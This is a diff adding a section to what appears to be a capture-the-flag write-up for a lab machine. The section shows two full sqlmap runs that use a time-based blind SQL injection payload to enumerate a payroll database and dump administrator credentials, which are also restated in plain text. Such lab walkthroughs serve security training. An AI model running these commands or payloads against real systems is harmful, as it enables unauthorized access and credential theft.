@@ -169,7 +169,158 @@ back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
 
 ### Database Enumeration
 
+```
+ sqlmap -r req.txt --batch --dump
+        ___
+       __H__                                                                                                                                                                                                                                
+ ___ ___[']_____ ___ ___  {1.9.11#stable}                                                                                                                                                                                                   
+|_ -| . [)]     | .'| . |                                                                                                                                                                                                                   
+|___|_  [(]_|_|_|__,|  _|                                                                                                                                                                                                                   
+      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                
 
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:43:17 /2026-09-16/
+
+[08:43:17] [INFO] parsing HTTP request from 'req.txt'
+[08:43:17] [INFO] resuming back-end DBMS 'mysql' 
+[08:43:17] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=test' AND (SELECT 3523 FROM (SELECT(SLEEP(5)))EHpf) AND 'iEAW'='iEAW&password=test
+---
+[08:43:17] [INFO] the back-end DBMS is MySQL
+web application technology: Nginx 1.14.2
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+[08:43:17] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[08:43:17] [INFO] fetching current database
+[08:43:17] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                                                                             
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
+[08:43:25] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+[08:43:35] [INFO] adjusting time delay to 1 second due to good response times
+payroll_db
+[08:44:15] [INFO] fetching tables for database: 'payroll_db'
+[08:44:15] [INFO] fetching number of tables for database 'payroll_db'
+[08:44:15] [INFO] retrieved: 11
+[08:44:18] [INFO] retrieved: position
+[08:44:53] [INFO] retrieved: employee
+[08:45:23] [INFO] retrieved: department
+[08:46:02] [INFO] retrieved: payroll_items
+[08:46:56] [INFO] retrieved: attendance
+[08:47:31] [INFO] retrieved: employee_deductions
+[08:48:45] [INFO] retrieved: employee_allowances
+[08:49:32] [INFO] retrieved: users
+[08:49:50] [INFO] retrieved: deductions
+[08:50:27] [INFO] retrieved: payroll
+[08:50:57] [INFO] retrieved: allowances
+[08:51:34] [INFO] fetching columns for table 'allowances' in database 'payroll_db'
+[08:51:34] [INFO] retrieved: 3
+[08:51:38] [INFO] retrieved: id
+[08:51:45] [INFO] retrieved: allowance
+[08:52:18] [INFO] retrieved: description
+[08:53:00] [INFO] fetching entries for table 'allowances' in database 'payroll_db'
+[08:53:00] [INFO] fetching number of entries for table 'allowances' in database 'payroll_db'
+[08:53:00] [INFO] retrieved: 4
+[08:53:01] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                                                                                                    
+Sample Allowance
+[08:54:03] [INFO] retrieved: Sample
+[08:54:26] [INFO] retrieved: 1
+[08:54:29] [INFO] retrieved: Phone Allowance
+[08:55:32] [INFO] retrieved: Phon^C
+[08:55:54] [WARNING] Ctrl+C detected in dumping phase                                                                                                                                                                                      
+Database: payroll_db
+Table: allowances
+[1 entry]
++----+-----------+------------------+
+| id | allowance | description      |
++----+-----------+------------------+
+| 1  | Sample    | Sample Allowance |
++----+-----------+------------------+
+
+[08:55:54] [INFO] table 'payroll_db.allowances' dumped to CSV file '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/dump/payroll_db/allowances.csv'
+[08:55:54] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb'
+[08:55:54] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 08:55:54 /2026-09-16/
+
+
+```
+
+```
+sqlmap -r req.txt --dump -T users -D payroll_db 
+        ___
+       __H__                                                                                                                                                                                                                                
+ ___ ___[(]_____ ___ ___  {1.9.11#stable}                                                                                                                                                                                                   
+|_ -| . ["]     | .'| . |                                                                                                                                                                                                                   
+|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                                                                   
+      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 09:06:07 /2026-09-16/
+
+[09:06:07] [INFO] parsing HTTP request from 'req.txt'
+[09:06:07] [INFO] resuming back-end DBMS 'mysql' 
+[09:06:07] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=test' AND (SELECT 3523 FROM (SELECT(SLEEP(5)))EHpf) AND 'iEAW'='iEAW&password=test
+---
+[09:06:07] [INFO] the back-end DBMS is MySQL
+web application technology: Nginx 1.14.2
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+[09:06:07] [INFO] fetching columns for table 'users' in database 'payroll_db'
+[09:06:07] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                                                                             
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
+[09:06:17] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+[09:06:27] [INFO] adjusting time delay to 1 second due to good response times
+8
+[09:06:27] [INFO] retrieved: id
+[09:06:34] [INFO] retrieved: doctor_id
+[09:07:14] [INFO] retrieved: name
+[09:07:27] [INFO] retrieved: address
+[09:07:51] [INFO] retrieved: contact
+[09:08:17] [INFO] retrieved: username
+[09:08:43] [INFO] retrieved: password
+[09:09:16] [INFO] retrieved: type
+[09:09:34] [INFO] fetching entries for table 'users' in database 'payroll_db'
+[09:09:34] [INFO] fetching number of entries for table 'users' in database 'payroll_db'
+[09:09:34] [INFO] retrieved: 1
+[09:09:35] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                                                                                                    
+Administrator
+[09:10:25] [INFO] retrieved: 1
+[09:10:28] [INFO] retrieved: 
+[09:10:28] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[09:10:28] [INFO] retrieved: 
+[09:10:29] [INFO] retrieved: 0
+[09:10:35] [INFO] retrieved: 1
+[09:10:37] [INFO] retrieved: SuperGucciRainbowCake
+[09:11:55] [INFO] retrieved: Enemigosss
+Database: payroll_db
+Table: users
+[1 entry]
++----+-----------+---------------+--------+---------+---------+-----------------------+------------+
+| id | doctor_id | name          | type   | address | contact | password              | username   |
++----+-----------+---------------+--------+---------+---------+-----------------------+------------+
+| 1  | 0         | Administrator | 1      | <blank> | <blank> | SuperGucciRainbowCake | Enemigosss |
++----+-----------+---------------+--------+---------+---------+-----------------------+------------+
+
+[09:12:32] [INFO] table 'payroll_db.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/dump/payroll_db/users.csv'
+[09:12:32] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb'
+[09:12:32] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 09:12:32 /2026-09-16/
+
+                                                    
+```
+
+Enemigosss:SuperGucciRainbowCake
 
 ---
 ## User Flag
